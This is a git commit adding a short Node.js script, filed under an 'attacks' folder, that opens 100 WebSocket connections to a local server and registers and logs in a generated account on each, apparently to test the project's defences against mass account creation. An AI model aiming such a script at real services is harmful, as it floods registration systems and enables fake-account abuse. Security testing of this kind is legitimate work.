86fd6b78a7d346a13e5f71ebdc77216f4132eb83
B1gzy <99110048+B1gzy@users.noreply.github.com>
2024-04-13 18:24:49 +1000

    Fixed Mass Account and API Manipulation

---
+++ innerLayer/attacks/API_Manipulation/mass_account.js
@@ -0,0 +1,43 @@
+const WebSocket = require('ws');
+
+for (let i = 0; i < 100; i++) {
+
+    class WebSocketClient {
+        constructor(url) {
+            this.url = url;
+            this.socket = new WebSocket(url);
+    
+            this.socket.on('open', () => {
+                console.log('WebSocket connection established.');
+            });
+    
+            this.socket.on('message', (data) => {
+                const message = JSON.parse(data);
+    
+                console.log('Message received from server:', message);
+                if (message.action === 'checkRegistration') {
+                    this.send({ action: 'register', username: 'example_user' + i, password: 'example_password', email: 'example@example.com' });
+                }
+    
+                if (message.action === 'registrationSuccess') {
+                    this.send({ action: 'login', username: 'example_user' + i, password: 'example_password'});
+                }
+            });
+    
+            this.socket.on('close', () => {
+                console.log('WebSocket connection closed.');
+            });
+    
+            this.socket.on('error', (error) => {
+                console.error('WebSocket error:', error);
+            });
+        }
+    
+        send(data) {
+            this.socket.send(JSON.stringify(data));
+            console.log('Message sent to server:', data);
+        }
+    }
+    
+    const client = new WebSocketClient('ws://localhost:8100'); // Replace with your WebSocket server address
+}
